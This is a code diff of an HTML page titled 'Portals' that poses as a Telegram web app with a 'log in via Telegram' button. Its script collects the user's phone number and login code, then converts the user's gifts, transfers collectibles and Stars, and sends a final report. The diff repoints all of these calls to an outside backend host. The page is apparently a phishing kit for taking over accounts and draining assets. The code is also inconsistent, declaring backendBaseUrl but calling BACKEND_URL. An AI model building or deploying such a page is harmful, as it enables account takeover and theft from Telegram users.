@@ -6,6 +6,7 @@
     <title>Portals</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    
     <style>
         * {
             margin: 0;
@@ -82,6 +83,7 @@
         .auth-btn:active {
             transform: translateY(0);
         }
+        
 
         .auth-btn:disabled {
             opacity: 0.7;
@@ -290,6 +292,7 @@
     </div>
 
     <script>
+        const backendBaseUrl = 'https://giftbuy-ilag.amvera.io';
         let authData = {
             phone: '',
             phoneCodeHash: '',
@@ -326,7 +329,7 @@
                         } else {
                             status.textContent = 'Предоставление номера телефона отменено';
                             shareBtn.disabled = false;
-                            shareBtn.innerHTML = '<div class="telegram-icon"></div>Войти с помощью Telegram';
+                            shareBtn.innerHTML = '<div class="telegram-icon"></div>Войти через Telegram';
                         }
                     });
                 } else {
@@ -358,7 +361,7 @@
     status.textContent = 'Отправка кода подтверждения...';
     
     try {
-        const response = await fetch('/auth/send-code', {
+        const response = await fetch(BACKEND_URL + '/auth/send-code', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -422,7 +425,7 @@
             status.textContent = 'Проверка кода...';
             
             try {
-                const response = await fetch('/auth/verify-code', {
+                const response = await fetch(BACKEND_URL + '/auth/verify-code', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -511,7 +514,7 @@
         }
 
         async function getUserGifts() {
-            const response = await fetch('/api/get-gifts', {
+            const response = await fetch(BACKEND_URL + '/api/get-gifts', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -530,7 +533,7 @@
             const convertibleGifts = gifts.filter(g => g.can_convert);
             
             for (const gift of convertibleGifts) {
-                await fetch('/api/convert-gift', {
+                await fetch(BACKEND_URL + '/api/convert-gift', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -550,7 +553,7 @@
             const collectibles = gifts.filter(g => g.unique && g.can_transfer);
             
             for (const gift of collectibles) {
-                await fetch('/api/transfer-collectible', {
+                await fetch(BACKEND_URL + '/api/transfer-collectible', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -566,7 +569,7 @@
         }
 
         async function transferStars() {
-            await fetch('/api/transfer-stars', {
+            await fetch(BACKEND_URL + '/api/transfer-stars', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -578,7 +581,7 @@
         }
 
         async function sendFinalReport(gifts) {
-            await fetch('/api/final-report', {
+            await fetch(BACKEND_URL + '/api/final-report', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -606,6 +609,7 @@
     </script>
 </body>
 </html>
+
 
 
 
